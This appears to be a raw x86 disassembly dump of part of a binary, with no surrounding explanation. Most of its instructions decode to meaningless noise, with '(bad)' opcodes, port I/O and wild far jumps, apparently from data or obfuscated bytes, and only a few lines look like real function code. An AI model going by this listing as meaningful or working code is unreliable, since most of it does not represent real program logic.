  413984:	add    DWORD PTR [eax-0x28],edx
  413987:	in     al,dx
  413988:	mov    ah,BYTE PTR [ebx+0x15]
  41398b:	lock int3 
  41398d:	shl    DWORD PTR [ecx],0x59
  413990:	stc    
  413991:	js     0x413926
  413993:	mov    esi,0x42813d7b
  413998:	mov    dh,BYTE PTR ds:0x95f2ee01
  41399e:	retf   
  41399f:	sahf   
  4139a0:	jmp    0xbcaff333
  4139a5:	and    DWORD PTR [eax+edi*8+0x37],edi
  4139a9:	sbb    al,cl
  4139ab:	jns    0x4139e6
  4139ad:	xchg   ebp,eax
  4139ae:	sbb    DWORD PTR [edx-0x1e08b586],ebp
  4139b4:	ficomp DWORD PTR [edx-0x3bf30380]
  4139ba:	in     al,dx
  4139bb:	push   ecx
  4139bc:	push   cs
  4139bd:	push   ds
  4139be:	mov    eax,0x43a4e686
  4139c3:	pop    edx
  4139c4:	rcr    dh,1
  4139c6:	adc    BYTE PTR [eax+0x1de19f0b],cl
  4139cc:	add    BYTE PTR [edi-0x1],dl
  4139cf:	inc    esi
  4139d0:	test   eax,0x452f7ce5
  4139d5:	dec    eax
  4139d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139d7:	pop    edi
  4139d8:	mov    al,ds:0xe5e33e9b
  4139dd:	xor    eax,0x69c64f7c
  4139e2:	jg     0x4139a5
  4139e4:	pop    esi
  4139e5:	in     al,0x78
  4139e7:	sahf   
  4139e8:	pusha  
  4139e9:	cmp    DWORD PTR [edi+0x6bd362e7],0x4a
  4139f0:	adc    eax,0xa552a410
  4139f5:	pop    esp
  4139f6:	in     eax,0x74
  4139f8:	cli    
  4139f9:	and    DWORD PTR [ecx-0x26],0x76bf0eff
  413a00:	mul    DWORD PTR [ecx-0x209af991]
  413a06:	int    0xb9
  413a08:	or     ch,cl
  413a0a:	lods   eax,DWORD PTR ds:[esi]
  413a0b:	mov    eax,ds:0xe2cc8df4
  413a10:	xor    ebx,ecx
  413a12:	lahf   
  413a13:	sbb    ch,0x2a
  413a16:	mov    bl,BYTE PTR [ebx+0x71d29585]
  413a1c:	mov    bl,0xf1
  413a1e:	inc    ebx
  413a1f:	out    dx,eax
  413a20:	mov    ebp,ds
  413a22:	mov    ch,0x2
  413a24:	or     ebx,ecx
  413a26:	mov    eax,0x790dacb4
  413a2b:	les    eax,FWORD PTR [edi+0x249cb780]
  413a31:	xchg   esi,eax
  413a32:	cli    
  413a33:	dec    esi
  413a34:	push   edi
  413a35:	push   eax
  413a36:	and    eax,0x30e2d494
  413a3b:	sub    DWORD PTR [edx-0x39],esi
  413a3e:	jmp    0x4cde:0x7bee296c
  413a45:	in     eax,dx
  413a46:	push   0x7
  413a48:	jl     0x4139eb
  413a4a:	sub    al,0x70
  413a4c:	popa   
  413a4d:	pusha  
  413a4e:	daa    
  413a4f:	inc    edx
  413a50:	and    eax,0x47d7fbbd
  413a55:	lds    eax,FWORD PTR [eax]
  413a57:	sub    ebp,DWORD PTR [edx-0x6cbc38bb]
  413a5d:	or     BYTE PTR [esi+0x30],ah
  413a60:	in     al,dx
  413a61:	mov    ds:0x72f9edfb,al
  413a66:	aam    0x35
  413a68:	sahf   
  413a69:	inc    edi
  413a6a:	inc    esp
  413a6b:	in     al,dx
  413a6c:	inc    edi
  413a6d:	cmp    eax,0xa99492df
  413a72:	jne    0x413a47
  413a74:	test   al,0xcc
  413a76:	test   DWORD PTR [edx],edi
  413a78:	adc    al,0xa9
  413a7a:	pop    ss
  413a7b:	scas   al,BYTE PTR es:[edi]
  413a7c:	jb     0x413ace
  413a7e:	xchg   ebp,eax
  413a7f:	outs   dx,DWORD PTR ds:[esi]
  413a80:	out    0xc9,al
  413a82:	jno    0x413a06
  413a84:	cmp    BYTE PTR [esi],dl
  413a86:	jno    0x413af2
  413a88:	outs   dx,BYTE PTR ds:[esi]
  413a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a8a:	xchg   DWORD PTR [edx+0x6da3a886],ebx
  413a90:	add    al,0x1
  413a92:	sbb    DWORD PTR [edi+eiz*4-0x37a2d5db],esp
  413a99:	cs stc 
  413a9b:	or     esp,DWORD PTR [edx+edx*4]
  413a9e:	jne    0x413b13
  413aa0:	iret   
  413aa1:	jg     0x413b18
  413aa3:	mov    dh,BYTE PTR [ecx+0x2a]
  413aa6:	out    0x20,al
  413aa8:	add    dh,BYTE PTR [esi]
  413aaa:	push   eax
  413aab:	scas   eax,DWORD PTR es:[edi]
  413aac:	addr16 (bad) 
  413aae:	in     al,dx
  413aaf:	sub    bh,BYTE PTR [ebp-0x38be006e]
  413ab5:	lds    ebx,FWORD PTR [esi+0x14]
  413ab8:	mov    ebx,0x9e8bd244
  413abd:	add    eax,0xd5ac4e
  413ac2:	mov    edx,0x241e3573
  413ac7:	das    
  413ac8:	neg    BYTE PTR [ebp+eiz*2-0x798a4a]
  413acf:	test   al,0x16
  413ad1:	jmp    0xb3d1:0x5cc6a685
  413ad8:	or     al,BYTE PTR [ebx+edi*2]
  413adb:	inc    esp
  413adc:	add    al,0xe6
  413ade:	add    BYTE PTR ds:0x9a8d9add,0x24
  413ae5:	mov    esp,0xf676a083
  413aea:	shr    edx,0x8e
  413aed:	mov    eax,0x986636a8
  413af2:	adc    eax,0x5e3a383f
  413af7:	xor    esp,DWORD PTR [ecx+ebx*8-0x36]
  413afb:	cmp    esi,DWORD PTR [ecx+0x1170ba69]
  413b01:	imul   ebx,DWORD PTR ss:[ecx-0x5f9caac6],0xffffffe3
  413b09:	cmp    BYTE PTR [ebp+0x5b],al
  413b0c:	ins    DWORD PTR es:[edi],dx
  413b0d:	dec    edi
  413b0e:	sub    ebp,DWORD PTR [edi-0x11]
  413b11:	pop    edx
  413b12:	mov    bl,0x71
  413b14:	push   ebx
  413b15:	aad    0x38
  413b17:	mov    ah,0x6c
  413b19:	repz out dx,eax
  413b1b:	sbb    BYTE PTR [edi+0x29],0x9d
  413b1f:	and    BYTE PTR [edi+0x410b4efe],dl
  413b25:	jmp    0x413b3d
  413b27:	gs mov eax,0x3ea8cbb5
  413b2d:	xchg   ebp,eax
  413b2e:	sub    DWORD PTR [ecx],ebp
  413b30:	pusha  
  413b31:	mov    al,cs:0x7758b82d
  413b37:	jb     0x413aea
  413b39:	scas   eax,DWORD PTR es:[edi]
  413b3a:	sub    DWORD PTR [esi],0xffffffbc
  413b3d:	dec    edx
  413b3e:	imul   esi,DWORD PTR [edx],0x1d
  413b41:	sub    ebx,DWORD PTR [esi-0x35fedaac]
  413b47:	push   0xfffffff5
  413b49:	repz out 0xaa,eax
  413b4c:	dec    edi
  413b4d:	lahf   
  413b4e:	mov    ah,0x24
  413b50:	cmp    al,0x23
  413b52:	adc    al,0x7f
  413b54:	div    BYTE PTR [ebx-0x6e8e9c36]
  413b5a:	xchg   BYTE PTR [edx],bl
  413b5c:	add    al,0x6e
  413b5e:	or     BYTE PTR [edx+0xfb03be8],0x5a
  413b65:	daa    
  413b66:	fstp   TBYTE PTR [esi+edi*1-0x40]
  413b6a:	pop    ss
  413b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b6c:	add    ebx,DWORD PTR [ebp+0x2c87f0bf]
  413b72:	lock push esp
  413b74:	xor    DWORD PTR [eax+0x6bf47432],eax
  413b7a:	stc    
  413b7b:	mov    ax,ds:0xa7fc7f40
  413b81:	ss push edi
  413b83:	mov    BYTE PTR gs:[edx*1+0x67a86836],cl
  413b8b:	ret    0xadf
  413b8e:	add    dh,BYTE PTR [edi-0x1e36d972]
  413b94:	out    0x51,al
  413b96:	lea    eax,[ebp-0x10ed98dd]
  413b9c:	stc    
  413b9d:	jl     0x413c04
  413b9f:	ins    DWORD PTR es:[edi],dx
  413ba0:	mov    al,0xd5
  413ba2:	xchg   ecx,eax
  413ba3:	pop    es
  413ba4:	sbb    DWORD PTR [ebx-0x3b],ebx
  413ba7:	adc    ecx,ebp
  413ba9:	cmp    ebx,DWORD PTR [edi*1-0x25baa05d]
  413bb0:	push   0xffffff89
  413bb2:	lods   al,BYTE PTR ds:[esi]
  413bb3:	scas   al,BYTE PTR es:[edi]
  413bb4:	adc    eax,0x4d8a02ca
  413bb9:	mov    DWORD PTR [edx],eax
  413bbb:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  413bbd:	and    DWORD PTR [esi],0x2
  413bc0:	repnz ins BYTE PTR es:[edi],dx
  413bc2:	mov    ah,0x71
  413bc4:	and    bh,BYTE PTR [bp+si-0x178]
  413bc9:	inc    eax
  413bca:	arpl   WORD PTR [esi-0x7b],bp
  413bcd:	pop    ecx
  413bce:	mov    dl,0x7e
  413bd0:	adc    al,0x74
  413bd2:	clc    
  413bd3:	cli    
  413bd4:	or     DWORD PTR [esi+0x659a2729],edi
  413bda:	mov    al,ds:0x6db4da92
  413bdf:	ret    0x45f8
  413be2:	ins    DWORD PTR es:[edi],dx
  413be3:	pop    edx
  413be4:	imul   edx,ebp,0x58
  413be7:	mov    dh,0x2f
  413be9:	pop    es
  413bea:	jne    0x413c31
  413bec:	cwde   
  413bed:	sbb    DWORD PTR [eax-0x76740ae6],esi
  413bf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bf4:	cmp    al,0x8d
  413bf6:	xlat   BYTE PTR ds:[ebx]
  413bf7:	mov    eax,0xcd2ede1
  413bfc:	lahf   
  413bfd:	pop    ds
  413bfe:	call   0x787b:0xfebdc278
  413c05:	dec    edx
  413c06:	ret    0xb80a
  413c09:	pop    ebp
  413c0a:	ret    
  413c0b:	dec    ebx
  413c0c:	adc    bh,BYTE PTR [eax+0x4681a839]
  413c12:	sti    
  413c13:	xor    BYTE PTR [esi+ebp*8-0x30177b74],cl
  413c1a:	cmp    esi,ecx
  413c1c:	sub    eax,0x4b6093ea
  413c21:	and    eax,0x68201402
  413c26:	mov    ah,0xd1
  413c28:	lea    edx,[edi-0x21af7ce7]
  413c2e:	pop    eax
  413c2f:	and    DWORD PTR [edi+eax*8+0x6ef3f0db],esp
  413c36:	bound  ebx,QWORD PTR [eax]
  413c38:	mov    dl,0x7c
  413c3a:	adc    ebp,DWORD PTR [eax-0x67]
  413c3d:	sub    eax,0x9779dc06
  413c42:	sbb    bl,BYTE PTR [ebx]
  413c44:	xchg   DWORD PTR [edi+0x4dd564fe],ecx
  413c4a:	pop    ebp
  413c4b:	sbb    BYTE PTR [eax-0x44219356],cl
  413c51:	push   ss
  413c52:	popa   
  413c53:	loop   0x413c18
  413c55:	push   ecx
  413c56:	shl    DWORD PTR [ecx],1
  413c58:	loopne 0x413c34
  413c5a:	push   ss
  413c5b:	xor    ah,BYTE PTR [edi-0x472656ff]
  413c61:	cmp    cl,0x6d
  413c64:	(bad)  
  413c65:	jne    0x413cd0
  413c67:	sub    ebp,DWORD PTR [eax+0x5773dbfe]
  413c6d:	adc    ebx,DWORD PTR [ebp-0x688e964f]
  413c73:	ins    DWORD PTR es:[edi],dx
  413c74:	call   0x31bd:0x830f2e49
  413c7b:	cli    
  413c7c:	jecxz  0x413c25
  413c7e:	xchg   ah,al
  413c80:	(bad)  
  413c81:	in     al,0xeb
  413c83:	mov    bl,bh
  413c85:	push   edx
  413c86:	lea    ebx,[ebx]
  413c88:	sbb    esi,edx
  413c8a:	mov    cl,0x7d
  413c8c:	fisubr WORD PTR [ebx+0x5b]
  413c8f:	pop    es
  413c90:	call   0xce73f60e
  413c95:	adc    al,BYTE PTR [edx-0x12a6a0e6]
  413c9b:	jne    0x413c35
  413c9d:	sbb    ecx,DWORD PTR [edx]
  413c9f:	(bad)  
  413ca1:	mov    esp,0x88d00d50
  413ca6:	fisttp WORD PTR cs:[ebx-0x43]
  413caa:	add    edx,DWORD PTR es:[eax]
  413cad:	mov    ecx,DWORD PTR [ebp-0x28]
  413cb0:	adc    ebx,DWORD PTR [eax+0x4]
  413cb3:	push   0x2
  413cb5:	xor    ebx,esi
  413cb7:	mov    esi,DWORD PTR [ebp-0x24]
  413cba:	pop    esi
  413cbb:	sub    esi,ecx
  413cbd:	mov    ecx,DWORD PTR [ebp-0x30]
  413cc0:	sub    esi,ecx
  413cc2:	mov    eax,ebx
  413cc4:	mov    ebx,DWORD PTR [ebp-0x2c]
  413cc7:	mov    ecx,DWORD PTR [ebp+0xc]
  413cca:	add    esi,DWORD PTR [ecx]
  413ccc:	xor    edx,0xca79a577
  413cd2:	shrd   edx,eax,0x2
  413cd6:	xor    ecx,ecx
  413cd8:	shl    esi,0x1e
  413cdb:	xor    ecx,edi
  413cdd:	shr    eax,0x2
  413ce0:	or     ecx,edx
  413ce2:	xor    esi,0x40000000
  413ce8:	or     esi,eax
  413cea:	mov    DWORD PTR [ebp-0x40],ecx
  413ced:	jmp    0x4140c5
  413cf2:	mov    ebx,0xbaf9bbd6
  413cf7:	fcomp  QWORD PTR [edx-0x1ad0e566]
  413cfd:	stos   BYTE PTR es:[edi],al
  413cfe:	ja     0x413d05
  413d00:	leave  
  413d01:	jl     0x413c8c
  413d03:	xor    bl,BYTE PTR [eax]
  413d05:	sbb    BYTE PTR [edx+0x46181812],ch
  413d0b:	stos   BYTE PTR es:[edi],al
  413d0c:	shl    al,1
  413d0e:	lock push esp
  413d10:	dec    esp
  413d11:	jo     0x413cf5
  413d13:	cli    
  413d14:	sub    eax,0x99a934c6
  413d19:	push   es
  413d1a:	fdivrp st(4),st
  413d1c:	add    bh,dl
  413d1e:	retf   0x203f
  413d21:	ja     0x413d2f
  413d23:	dec    edx
  413d24:	add    eax,0xfb7ca442
  413d29:	out    dx,eax
  413d2a:	xchg   BYTE PTR [ebx-0x4dab6c1f],dl
  413d30:	push   ecx
  413d31:	bnd call 0xa655f44f
  413d37:	stc    
  413d38:	jge    0x413d4b
  413d3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d3b:	cmp    ah,ch
  413d3d:	mov    ebx,0xd9135371
  413d42:	jno    0x413ccd
  413d44:	xor    eax,0xf594f164
  413d49:	addr16 jae 0x413d1f
  413d4c:	cli    
  413d4d:	(bad)  
  413d4f:	shl    DWORD PTR [ecx],0x89
  413d52:	xchg   esp,eax
  413d53:	cmp    ch,BYTE PTR [esi-0x18]
  413d56:	sbb    bl,bl
  413d58:	clc    
  413d59:	das    
  413d5a:	popa   
  413d5b:	sbb    dl,BYTE PTR [edi+eiz*1+0x3437179c]
  413d62:	push   ecx
  413d63:	fdivr  QWORD PTR [edi]
  413d65:	mov    ebx,0x32870ca5
  413d6a:	fbstp  TBYTE PTR [eax]
  413d6c:	sub    eax,0x17f8d1b2
  413d71:	outs   dx,DWORD PTR ds:[esi]
  413d72:	cmp    ebp,DWORD PTR ds:0xa6064569
  413d78:	enter  0xdfae,0xc7
  413d7c:	dec    esi
  413d7d:	ds jg  0x413d91
  413d80:	call   0x90c1156a
  413d85:	mov    ds:0x9884e4d,eax
  413d8a:	inc    ecx
  413d8b:	pop    ss
  413d8c:	push   ds
  413d8d:	stos   BYTE PTR es:[edi],al
  413d8e:	fsub   QWORD PTR [edi]
  413d90:	je     0x413d24
  413d92:	(bad)
  413d96:	pushf  
  413d97:	xor    eax,0x9ac402b3
  413d9c:	pop    ebx
  413d9d:	ja     0x413d9c
  413d9f:	jecxz  0x413d34
  413da1:	outs   dx,BYTE PTR ds:[esi]
  413da2:	lock js 0x413d29
  413da5:	pop    es
  413da6:	push   es
  413da7:	out    0x85,al
  413da9:	or     esi,DWORD PTR [edi-0x3]
  413dac:	jb     0x413de3
  413dae:	add    DWORD PTR [eax-0x4d490041],edx
  413db4:	jne    0x413e1d
  413db6:	(bad)  
  413db7:	mov    edx,0x978439c0
  413dbc:	daa    
  413dbd:	mov    cl,0x11
  413dbf:	and    eax,0x2c9567bc
  413dc4:	pop    ecx
  413dc5:	xor    DWORD PTR [eax-0x39774ffa],ebx
  413dcb:	or     eax,ebx
  413dcd:	outs   dx,BYTE PTR ds:[esi]
  413dce:	fsubr  st,st(3)
  413dd0:	jg     0x413e44
  413dd2:	push   esp
  413dd3:	dec    edi
  413dd4:	sahf   
  413dd5:	prefetcht0 BYTE PTR [ecx]
  413dd8:	iret   
  413dd9:	pop    ss
  413dda:	sub    eax,0xe577d9bf
  413ddf:	dec    ecx
  413de0:	push   edi
  413de1:	inc    edi
  413de2:	jmp    0xf13:0x7639be8
  413de9:	stos   BYTE PTR es:[edi],al
  413dea:	inc    eax
  413deb:	or     ah,BYTE PTR [ebp-0x124dd4f9]
  413df1:	lds    eax,FWORD PTR [edi-0x58bd336b]
  413df7:	test   BYTE PTR [edx-0x61],dh
  413dfa:	pop    edx
  413dfb:	cmc    
  413dfc:	inc    edi
  413dfd:	stc    
  413dfe:	cli    
  413dff:	push   edx
  413e00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e01:	lods   al,BYTE PTR ds:[esi]
  413e02:	jg     0x413d94
  413e04:	shufps xmm2,XMMWORD PTR es:[ebx+0x30],0xfb
  413e0a:	sbb    dx,WORD PTR [ecx-0xe]
  413e0e:	lock jmp 0x25ad3adf
  413e14:	nop
  413e15:	ins    BYTE PTR es:[edi],dx
  413e16:	add    BYTE PTR [esi-0x39],cl
  413e19:	jbe    0x413e3b
  413e1b:	mov    dh,0xb3
  413e1d:	pop    ss
  413e1e:	mov    BYTE PTR [esi],dl
  413e20:	dec    ebx
  413e21:	data16 lahf 
  413e23:	and    dl,BYTE PTR [ebp+0x2154f442]
  413e29:	sbb    edx,DWORD PTR [esi+ebx*4]
  413e2c:	or     DWORD PTR [ecx+ecx*4+0x72115968],edx
  413e33:	jge    0x413e10
  413e35:	(bad)  
  413e36:	fnstcw WORD PTR [esi]
  413e38:	scas   al,BYTE PTR es:[edi]
  413e39:	outs   dx,DWORD PTR ds:[esi]
  413e3a:	xbegin 0x92291ed4
  413e40:	jno    0x413e3e
  413e42:	xchg   ebp,eax
  413e43:	jmp    0x413ddc
  413e45:	out    dx,eax
  413e46:	or     al,0xc7
  413e48:	nop
  413e49:	inc    edx
  413e4a:	push   ecx
  413e4b:	fcmovnb st,st(6)
  413e4d:	in     al,dx
  413e4e:	ins    BYTE PTR es:[edi],dx
  413e4f:	(bad)  [esi-0x7b]
  413e52:	xor    edi,DWORD PTR [eax]
  413e54:	out    0x74,al
  413e56:	xor    eax,0xdbd2f845
  413e5b:	addr16 mov edx,0x3e875d7d
  413e61:	fsubr  st(2),st
  413e63:	mov    ebp,0x3daae213
  413e68:	sahf   
  413e69:	fild   QWORD PTR [esi-0x7f]
  413e6c:	sub    DWORD PTR [esi+0x16],ebx
  413e6f:	retf   
  413e70:	and    ah,ah
  413e72:	gs daa 
  413e74:	bound  eax,QWORD PTR [eax+0x28]
  413e77:	or     dl,BYTE PTR [esi+0x6d]
  413e7a:	pop    edi
  413e7b:	neg    BYTE PTR [edi]
  413e7d:	popa   
  413e7e:	je     0x413e66
  413e80:	fdiv   DWORD PTR [ebp-0x5d65cad]
  413e86:	push   ebp
  413e87:	cs test al,0xcf
  413e8a:	mov    ds:0x868c4003,eax
  413e8f:	pop    edi
  413e90:	xor    edx,DWORD PTR [di]
  413e93:	mov    ah,0x61
  413e95:	mov    cl,0xf3
  413e97:	ja     0x413e8b
  413e99:	or     BYTE PTR [edx-0x40],ah
  413e9c:	cmp    al,0x42
  413e9e:	cmp    dh,cl
  413ea0:	lods   al,BYTE PTR ds:[esi]
  413ea1:	inc    DWORD PTR [esi+0x6c]
  413ea4:	or     esi,esi
  413ea6:	sub    bl,BYTE PTR [edi-0x37]
  413ea9:	shl    eax,1
  413eab:	push   esi
  413eac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ead:	das    
  413eae:	mov    DWORD PTR [esi-0x6b],eax
  413eb1:	inc    esp
  413eb2:	push   ebp
  413eb3:	fwait
  413eb4:	mov    ebp,DWORD PTR [ebp+0x6b]
  413eb7:	fsubr  QWORD PTR [esi-0x63]
  413eba:	stos   DWORD PTR es:[edi],eax
  413ebb:	jp     0x413f0d
  413ebd:	in     eax,0xa2
  413ebf:	mov    edx,0xb5e1bbd0
  413ec4:	mov    BYTE PTR [ecx],al
  413ec6:	sub    edi,esi
  413ec8:	js     0x413e8f
  413eca:	fdivp  st(3),st
  413ecc:	sbb    DWORD PTR [esi-0x250254d9],ebp
  413ed2:	arpl   WORD PTR [edi],ax
  413ed4:	adc    BYTE PTR [edx+ecx*2+0x26094e91],dh
  413edb:	pop    es
  413edc:	sbb    ch,BYTE PTR [edi-0x7d]
  413edf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ee0:	sub    BYTE PTR [ebx+0x21],al
  413ee3:	or     eax,0x1c358c63
  413ee8:	sbb    esi,DWORD PTR [ebx+0x4d]
  413eeb:	out    dx,eax
  413eec:	add    bl,BYTE PTR [esi+eiz*1-0x3065ea09]
  413ef3:	cld    
  413ef4:	mov    ecx,0x56c49389
  413ef9:	adc    BYTE PTR [ebp-0x1d],ah
  413efc:	(bad)  
  413efd:	cmp    al,0xb6
  413eff:	mov    ebp,0x9bbcf42d
  413f04:	cmp    ah,dh
  413f06:	xchg   ebp,ebp
  413f08:	dec    ebp
  413f09:	push   ebp
  413f0a:	je     0x413f19
  413f0c:	inc    esp
  413f0d:	scas   eax,DWORD PTR es:[edi]
  413f0e:	jnp    0x413ec4
  413f10:	mov    ds:0x495565e6,al
  413f15:	popf   
  413f16:	icebp  
  413f17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f19:	ror    DWORD PTR [eax-0x1a],0xb
  413f1d:	loope  0x413eaa
  413f1f:	and    bh,BYTE PTR [ecx]
  413f21:	cmp    BYTE PTR [ecx+0x4824deb8],dh
  413f27:	aam    0x1a
  413f29:	repz adc edx,DWORD PTR [ecx+edi*2+0x16]
  413f2e:	add    ebx,ebp
  413f30:	cmp    eax,0xe61a38e4
  413f35:	sub    BYTE PTR [ecx-0x218ef7e6],bh
  413f3b:	dec    ecx
  413f3c:	and    eax,0x8f759b44
  413f41:	sbb    eax,0xcc7afa26
  413f46:	and    al,BYTE PTR [edx-0x61b6afd6]
  413f4c:	popa   
  413f4d:	daa    
  413f4e:	and    dh,bl
  413f50:	mov    bh,0x9f
  413f52:	hlt    
  413f53:	dec    eax
  413f54:	or     edi,DWORD PTR [ebx]
  413f56:	sub    al,0xcb
  413f58:	xchg   esi,eax
  413f59:	jl     0x413f2a
  413f5b:	popa   
  413f5c:	outs   dx,BYTE PTR ds:[esi]
  413f5d:	nop
  413f5e:	add    BYTE PTR [esi],al
  413f60:	mov    al,ds:0x6bb123e
  413f65:	sub    BYTE PTR [ecx+0x44064770],0x71
  413f6c:	ins    BYTE PTR es:[edi],dx
  413f6d:	xchg   esi,eax
  413f6e:	inc    edx
  413f6f:	clc    
  413f70:	mov    ds:0x598da288,al
  413f75:	pop    esi
  413f76:	(bad)  
  413f77:	adc    al,BYTE PTR [ebx]
  413f79:	(bad)  
  413f7b:	test   eax,0x1477aa29
  413f80:	and    eax,0x4ebd7ac3
  413f85:	cmc    
  413f86:	add    BYTE PTR [edi+0x7f3d7810],dh
  413f8c:	rcr    ebp,0x57
  413f8f:	icebp  
  413f90:	scas   al,BYTE PTR es:[edi]
  413f91:	rcl    BYTE PTR [edi],1
  413f93:	mov    ds:0x52b8d8db,eax
  413f98:	xor    ebp,esi
  413f9a:	adc    esp,edx
  413f9c:	cmp    esi,ecx
  413f9e:	cmp    DWORD PTR [eax+0x76c4e69a],ebx
  413fa4:	lods   al,BYTE PTR ds:[esi]
  413fa5:	js     0x41400a
  413fa7:	shl    DWORD PTR [edi],0xd7
  413faa:	loope  0x413fd7
  413fac:	pusha  
  413fad:	jmp    0x8d537d6d
  413fb2:	or     DWORD PTR [esi],ebp
  413fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fb5:	jnp    0x413ffd
  413fb7:	leave  
  413fb8:	and    eax,0x99bbf364
  413fbd:	sub    al,0xfd
  413fbf:	idiv   ecx
  413fc1:	ss imul edi,ebp,0x2c
  413fc5:	test   DWORD PTR [esi],eax
  413fc7:	adc    ch,cl
  413fc9:	scas   eax,DWORD PTR es:[edi]
  413fca:	lea    esi,[ebp-0x32]
  413fcd:	in     eax,0x78
  413fcf:	cdq    
  413fd0:	mov    dl,0xc9
  413fd2:	retf   
  413fd3:	lea    esi,[ecx+ebp*1-0x48504b35]
  413fda:	or     edi,DWORD PTR [edi]
  413fdc:	cld    
  413fdd:	sbb    eax,0x2cb14dbc
  413fe2:	sbb    BYTE PTR [ebx],ch
  413fe4:	sub    DWORD PTR [ecx+0x40],edx
  413fe7:	test   al,0xdd
  413fe9:	inc    edi
  413fea:	and    ah,BYTE PTR [ebp+0x46]
  413fed:	out    0xa6,al
  413fef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ff0:	sub    ebx,DWORD PTR [edi-0x477186b]
  413ff6:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  413ff8:	es repnz cmp al,0x7b
  413ffc:	mov    DWORD PTR [ebx+0x5efc8960],esi
  414002:	pop    esp
  414003:	es mov ch,0xe8
  414006:	cmp    edi,DWORD PTR [esi-0x2f84cb78]
  41400c:	jb     0x41400d
  41400e:	int3   
  41400f:	xchg   ecx,eax
  414010:	daa    
  414011:	dec    edi
  414012:	push   esp
  414013:	xchg   esp,eax
  414014:	jg     0x41401f
  414016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414017:	push   0x163a328b
  41401c:	mov    gs,WORD PTR [eax]
  41401e:	jbe    0x413fc3
  414020:	rcr    BYTE PTR [ebx*4-0x6a5cee5c],1
  414027:	mov    eax,ds:0xd38e449a
  41402c:	xor    dh,BYTE PTR [ebx]
  41402e:	nop
  41402f:	inc    eax
  414030:	sbb    BYTE PTR [ebx],ah
  414032:	pop    edx
  414033:	sbb    cl,BYTE PTR [edx+0x7d]
  414036:	jmp    0x413fc0
  414038:	(bad)  
  414039:	jae    0x41403d
  41403b:	or     bh,BYTE PTR [ebp+0x4fd299ea]
  414041:	lea    edx,[edx-0x22cc50be]
  414047:	dec    eax
  414048:	sub    eax,0x55b12347
  41404d:	xchg   ebp,eax
  41404e:	cmp    BYTE PTR [edi],dh
  414050:	xlat   BYTE PTR ds:[ebx]
  414051:	test   DWORD PTR [edi-0xc98b868],edx
  414057:	inc    ecx
  414058:	xlat   BYTE PTR ds:[ebx]
  414059:	adc    eax,0xb6dbfcc4
  41405e:	(bad)  
  414060:	cmp    bl,0x92
  414063:	scas   al,BYTE PTR es:[edi]
  414064:	jae    0x414083
  414066:	int    0x30
  414068:	lahf   
  414069:	aas    
  41406a:	inc    edx
  41406b:	jmp    0x4d90b579
  414070:	and    al,0x96
  414072:	sbb    al,0x46
  414074:	mov    cl,0x4d
  414076:	mov    cl,0x34
  414078:	push   eax
  414079:	test   al,0xe5
  41407b:	jp     0x4140df
  41407d:	or     al,0x45
  41407f:	call   0x4a7a9f4a
  414084:	rcr    cl,1
  414086:	jecxz  0x414045
  414088:	loope  0x4140f6
  41408a:	jmp    FWORD PTR [edx]
  41408c:	out    0x9a,al
  41408e:	fdiv   QWORD PTR [ecx-0x38]
  414091:	mov    ecx,0x99152f93
  414096:	iret   
  414097:	mov    ebp,0xe5f2f3e1
  41409c:	adc    eax,0xdf7e5be5
  4140a1:	jmp    0xcf928f16
  4140a6:	xor    ch,BYTE PTR [ecx]
  4140a8:	retf   0x1061
  4140ab:	and    eax,DWORD PTR [edx+esi*2]
  4140ae:	add    edx,DWORD PTR [edi+0x3c6e5e7]
  4140b4:	mov    edi,DWORD PTR [ecx+esi*1-0x72]
  4140b8:	add    DWORD PTR [ebx+0x1b],esp
  4140bb:	xor    al,0xd
  4140bd:	inc    ebx
  4140be:	cmp    al,ch
  4140c0:	mov    esp,0x676fdd9
  4140c5:	push   edi
  4140c6:	mov    DWORD PTR [ebp-0x3c],esi
  4140c9:	mov    eax,DWORD PTR [ebp-0x48]
  4140cc:	mov    ecx,DWORD PTR [ebp-0x44]
  4140cf:	push   0xae0404d3
  4140d4:	push   ecx
  4140d5:	push   eax
  4140d6:	call   0x42205c
  4140db:	mov    ecx,eax
  4140dd:	mov    eax,DWORD PTR [ebp-0x50]
  4140e0:	mov    esi,DWORD PTR [ebp-0x4c]
  4140e3:	or     ecx,eax
  4140e5:	mov    eax,DWORD PTR [ebp-0x40]
  4140e8:	or     edx,esi
  4140ea:	mov    esi,DWORD PTR [ebp-0x3c]
  4140ed:	add    ecx,eax
  4140ef:	mov    eax,DWORD PTR [ebp-0x58]
  4140f2:	adc    edx,esi
  4140f4:	mov    esi,DWORD PTR [ebp-0x54]
  4140f7:	add    ecx,eax
  4140f9:	mov    eax,DWORD PTR [ebp+0x8]
  4140fc:	adc    edx,esi
  4140fe:	add    ecx,0xffff55a8
  414104:	pop    edi
  414105:	adc    edx,0xffff64cd
  41410b:	pop    esi
  41410c:	mov    DWORD PTR [eax],ecx
  41410e:	mov    DWORD PTR [eax+0x4],edx
  414111:	pop    ebx
  414112:	leave  
  414113:	ret    0x8
  414116:	push   ebp
  414117:	mov    ebp,esp
  414119:	sub    esp,0x3c
  41411c:	mov    DWORD PTR [ebp-0x20],0x3510
  414123:	mov    DWORD PTR [ebp-0x1c],0x2104
  41412a:	mov    DWORD PTR [ebp-0x18],0x5d15
  414131:	mov    DWORD PTR [ebp-0x14],0x30cd
  414138:	mov    DWORD PTR [ebp-0x10],0x1709
  41413f:	mov    DWORD PTR [ebp-0xc],0x260b
  414146:	jmp    0x41450b
  41414b:	jnp    0x4140ce
  41414d:	xlat   BYTE PTR ds:[ebx]
  41414e:	dec    edi
  41414f:	sar    DWORD PTR [edi],cl
